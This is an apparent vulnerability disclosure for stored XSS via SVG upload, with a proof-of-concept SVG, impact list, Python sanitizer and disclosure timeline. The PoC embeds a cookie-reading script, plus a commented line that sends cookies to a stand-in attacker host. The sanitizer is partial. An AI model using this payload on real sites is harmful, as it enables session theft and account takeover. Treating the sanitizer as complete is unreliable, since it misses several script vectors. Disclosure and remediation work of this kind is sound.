# Stored XSS via SVG File Upload

**Severity:** High  
**CVSS:** 7.4  
**Type:** Stored Cross-Site Scripting  
**Target:** File upload functionality  

## Summary

Discovered a stored XSS vulnerability in a web application that allowed SVG file uploads without proper sanitization. By embedding JavaScript inside an SVG file, an attacker could execute arbitrary scripts in the context of any user viewing the uploaded file.

## Vulnerability Details

The application accepted `.svg` files in its document upload feature without:
1. Validating SVG content for embedded scripts
2. Sanitizing XML/SVG elements before storage/render
3. Serving uploaded files with proper Content-Type headers

## Proof of Concept

### Step 1: Create malicious SVG

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.cookie);
    // Or for session hijacking:
    // fetch("https://attacker.com/steal?c="+document.cookie)
  </script>
</svg>
```

### Step 2: Upload the file

Upload via the document upload endpoint (e.g., `/api/upload`).

### Step 3: Trigger execution

Navigate to the uploaded file URL — JavaScript executes in victim browser.

## Impact

- Session hijacking via cookie theft
- Account takeover
- Keylogging / credential theft
- Stored persistence (affects all viewers)

## Remediation

```python
import bleach
from lxml import etree

def sanitize_svg(content: bytes) -> bytes:
    """Strip scripts and event handlers from SVG"""
    try:
        tree = etree.fromstring(content)
        # Remove all script tags
        for elem in tree.iter("{http://www.w3.org/2000/svg}script"):
            elem.getparent().remove(elem)
        # Remove event handler attributes
        for elem in tree.iter():
            for attr in list(elem.attrib):
                if attr.startswith("on"):
                    del elem.attrib[attr]
        return etree.tostring(tree)
    except:
        raise ValueError("Invalid SVG content")
```

- Serve uploaded SVGs as `Content-Type: text/plain` or use a sandbox iframe
- Reject SVG uploads or use an allowlist of safe SVG elements
- Implement Content Security Policy (CSP) headers

## Timeline

| Date | Event |
|------|-------|
| 2024-01-15 | Vulnerability discovered |
| 2024-01-16 | Reported to vendor |
| 2024-01-20 | Vendor acknowledged |
| 2024-02-01 | Patch released |
| 2024-02-05 | Public disclosure |

## References

- [OWASP SVG Security](https://owasp.org/www-community/vulnerabilities/xss)
- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
